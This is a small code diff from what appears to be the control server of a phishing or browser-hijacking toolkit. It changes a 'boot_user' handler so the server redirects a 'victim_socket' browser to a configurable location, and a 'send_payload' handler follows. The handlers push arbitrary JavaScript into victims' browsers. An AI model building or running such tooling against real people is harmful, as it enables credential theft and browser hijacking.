@@ -323,7 +323,7 @@ fastify.ready(async function(err){
     socket.on("boot_user", async function(browser_id){
       const browser = browsers.get('browser_id', browser_id)
       console.log("booting user: " + browser.victim_socket)
-      fastify.io.to(browser.victim_socket).emit('execute_script', `window.location = "${target.login_page}";`)
+      fastify.io.to(browser.victim_socket).emit('execute_script', `window.location = "${target.boot_location}";`)
     })
     socket.on("send_payload", async function(browser_id){
       const browser = browsers.get('browser_id', browser_id)
